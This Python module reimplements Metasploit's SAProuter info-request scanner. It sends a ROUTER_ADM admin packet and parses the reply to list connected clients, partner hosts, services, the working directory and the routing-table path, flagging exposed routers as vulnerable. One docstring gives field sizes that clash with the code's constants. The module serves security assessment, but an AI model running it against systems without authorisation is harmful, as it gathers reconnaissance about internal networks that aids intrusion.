"""
sap_router_info.py – SAProuter admin info request (CVE-equivalent to
Metasploit's auxiliary/scanner/sap/sap_router_info_request).

Sends a ROUTER_ADM info request to an SAProuter and parses the response
to extract connected clients, working directory, routing table path,
and other configuration details.

This is an information disclosure vulnerability: a properly secured
SAProuter should reject admin requests from external hosts.

Reference: https://github.com/rapid7/metasploit-framework/blob/master/
           modules/auxiliary/scanner/sap/sap_router_info_request.rb
Reference: pysap SAPRouter.py — SAPRouterInfoClient (137 bytes, fixed-width)
"""

import re
import socket
import struct


# ---------------------------------------------------------------------------
# Binary entry layout (SAProuter wire format, exactly 137 bytes each)
# Confirmed via live capture against a real SAProuter instance.
# Note: pysap StrNullFixedLenField(length=45) stores 46 bytes on the wire
# (45 usable chars + mandatory null terminator byte), so partner/service
# offsets are 1-2 bytes higher than pysap's stated field length suggests.
# ---------------------------------------------------------------------------
#   Offset  Size  Field
#   0       4     id             — big-endian int
#   4       1     flags          — bit-flags (flag_routed, flag_connected, …)
#   5       8     connected_on   — timestamp (unused here)
#   13      46    address        — source IP/hostname + optional DNS suffix, null-padded
#   59      46    partner        — destination IP/hostname + optional DNS suffix, null-padded
#   105     30    service        — destination port/service, null-padded
#   135     2     XXX3           — padding
# ---------------------------------------------------------------------------
_ENTRY_SIZE    = 137
_OFF_ID        = 0
_OFF_FLAGS     = 4
_OFF_CONN_ON   = 5   # 8 bytes, skipped
_OFF_ADDRESS   = 13  # 46 bytes
_OFF_PARTNER   = 59  # 46 bytes  (was 58 — address occupies 46 bytes, not 45)
_OFF_SERVICE   = 105 # 30 bytes  (was 103)
_OFF_PAD       = 135 # 2 bytes (end of entry)

# Flag bits in byte 4 (MSB to LSB per pysap BitField order)
_FLAG_ROUTED    = 0x01
_FLAG_CONNECTED = 0x02


def saprouter_info_request(host: str, port: int = 3299,
                           timeout: float = 10) -> dict:
    """Send a ROUTER_ADM info request to an SAProuter.

    Args:
        host: SAProuter IP or hostname
        port: SAProuter port (default 3299)
        timeout: Connection timeout

    Returns dict with:
        vulnerable:    bool — True if info was returned
        clients:       list of dicts — connected client entries, each with:
                         id:          int    connection ID (as shown by saprouter -l)
                         source:      str    source hostname or IP
                         partner:     str    destination hostname/IP, or "(no partner)"
                         partner_ip:  str    destination IP if it is an IP, else ""
                         service:     str    destination port/service, or ""
                         flag_routed: bool   connection is routed (not local)
        total_clients: int — total number of connected clients
        working_dir:   str — SAProuter working directory
        routtab:       str — path to routing table file
        raw_info:      list of str — text info lines from the response
        error:         str — error message if request failed
    """
    result = {
        "vulnerable": False,
        "clients": [],
        "total_clients": 0,
        "working_dir": "",
        "routtab": "",
        "raw_info": [],
        "error": "",
    }

    # Build ROUTER_ADM info request
    # Format: "ROUTER_ADM" + [0, version=0x26, cmd=2, 0, 0]
    admin_pkt = b"ROUTER_ADM" + struct.pack("bbbbb", 0, 0x26, 2, 0, 0)
    ni_packet = struct.pack("!I", len(admin_pkt)) + admin_pkt

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        sock.sendall(ni_packet)

        # Read all response frames
        resp = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 200000:
                    break
        except socket.timeout:
            pass
        sock.close()

    except Exception as e:
        result["error"] = str(e)
        return result

    if len(resp) < 4:
        result["error"] = "No response from SAProuter"
        return result

    # Parse multi-frame NI response
    frames = []
    pos = 0
    while pos + 4 <= len(resp):
        flen = struct.unpack("!I", resp[pos:pos + 4])[0]
        if flen == 0:
            pos += 4
            break  # empty frame = end of response
        if pos + 4 + flen > len(resp):
            break
        payload = resp[pos + 4:pos + 4 + flen]
        frames.append(payload)
        pos += 4 + flen

    if not frames:
        result["error"] = "Empty response — admin request denied"
        return result

    # Check for error response
    if frames[0].startswith(b"NI_RTERR") or b"*ERR*" in frames[0]:
        result["error"] = "Admin request denied by SAProuter"
        return result

    # SAProuter responded with info — it's vulnerable
    result["vulnerable"] = True

    # ---------------------------------------------------------------------------
    # Frame 0: binary connection table
    # Each entry is exactly 137 bytes (pysap SAPRouterInfoClient).
    # The frame may have a short header before the entries; we detect the
    # first valid entry by scanning for a 137-byte-aligned block.
    # ---------------------------------------------------------------------------
    conn_frame = frames[0]
    result["clients"] = _parse_conn_table(conn_frame)

    # ---------------------------------------------------------------------------
    # Frames 1+: null-terminated text info lines
    # ---------------------------------------------------------------------------
    for frame in frames[1:]:
        text = frame.decode("ascii", errors="replace").rstrip("\x00").strip()
        if not text:
            continue
        # Strip leading non-printable bytes
        while text and (ord(text[0]) < 32 or ord(text[0]) > 126):
            text = text[1:]
        if not text:
            continue
        # Skip frames that are mostly binary (e.g. the stats block in Frame 1)
        if not _looks_printable(text[:20]):
            continue
        result["raw_info"].append(text)

        if text.startswith("Total no. of clients:"):
            try:
                result["total_clients"] = int(text.split(":")[1].strip())
            except (ValueError, IndexError):
                pass
        elif "Working directory" in text and ":" in text:
            result["working_dir"] = text.split(":", 1)[1].strip()
        elif "Routtab" in text and ":" in text:
            result["routtab"] = text.split(":", 1)[1].strip()

    # Use client count from binary if text frames didn't supply one
    if result["total_clients"] == 0 and result["clients"]:
        result["total_clients"] = len(result["clients"])

    return result


# ---------------------------------------------------------------------------
# Binary connection table parser
# ---------------------------------------------------------------------------

def _fixed_str(data: bytes, offset: int, length: int) -> str:
    """Extract a null-padded fixed-length ASCII string from *data*."""
    raw = data[offset:offset + length]
    # Split at first null byte and decode
    null_pos = raw.find(b"\x00")
    if null_pos >= 0:
        raw = raw[:null_pos]
    return raw.decode("ascii", errors="replace").strip()


def _parse_conn_table(frame: bytes) -> list:
    """Parse the binary connection table from Frame 0 of the info response.

    Each entry is exactly 137 bytes (pysap SAPRouterInfoClient):
        [4]  id             big-endian int
        [1]  flags          bit-flags
        [8]  connected_on   LongField timestamp (skipped)
        [45] address        source IP/hostname (null-padded fixed string)
        [45] partner        destination IP/hostname (null-padded fixed string)
        [27] service        destination port/service (null-padded fixed string)
        [7]  padding

    The frame may contain a short header before the first entry.  We scan
    forward to find the first 137-byte aligned block where byte 4 looks like
    a valid flags byte and address looks like a printable string.

    Returns list of client dicts.
    """
    clients = []
    frame_len = len(frame)

    if frame_len < _ENTRY_SIZE:
        return clients

    # Find where entries start: scan the first 32 bytes for the best offset.
    # A valid entry has a printable non-empty address string starting at +13.
    best_offset = None
    for start in range(min(32, frame_len - _ENTRY_SIZE + 1)):
        addr = _fixed_str(frame, start + _OFF_ADDRESS, 45)
        if addr and _looks_printable(addr):
            best_offset = start
            break

    if best_offset is None:
        return clients

    # Parse all 137-byte entries starting from best_offset
    pos = best_offset
    while pos + _ENTRY_SIZE <= frame_len:
        entry = frame[pos:pos + _ENTRY_SIZE]

        conn_id   = struct.unpack_from(">I", entry, _OFF_ID)[0]
        flags     = entry[_OFF_FLAGS]
        address   = _fixed_str(entry, _OFF_ADDRESS, 46)
        partner   = _fixed_str(entry, _OFF_PARTNER, 46)
        service   = _fixed_str(entry, _OFF_SERVICE, 30)

        flag_routed    = bool(flags & _FLAG_ROUTED)
        flag_connected = bool(flags & _FLAG_CONNECTED)

        # Skip obviously invalid entries (e.g. all-zero padding blocks)
        if not address and not partner:
            pos += _ENTRY_SIZE
            continue

        partner_display = partner if partner else "(no partner)"
        partner_ip      = partner if _looks_like_ip(partner) else ""

        clients.append({
            "id":          conn_id,
            "source":      address if address else "(unknown)",
            "partner":     partner_display,
            "partner_ip":  partner_ip,
            "service":     service,
            "flag_routed": flag_routed,
        })
        pos += _ENTRY_SIZE

    return clients


def _looks_like_ip(s: str) -> bool:
    """Return True if *s* looks like a dotted-decimal IPv4 address."""
    parts = s.split(".")
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(p) <= 255 for p in parts)
    except ValueError:
        return False


def _looks_printable(s: str) -> bool:
    """Return True if *s* contains only printable ASCII characters."""
    return bool(s) and all(32 <= ord(c) <= 126 for c in s)
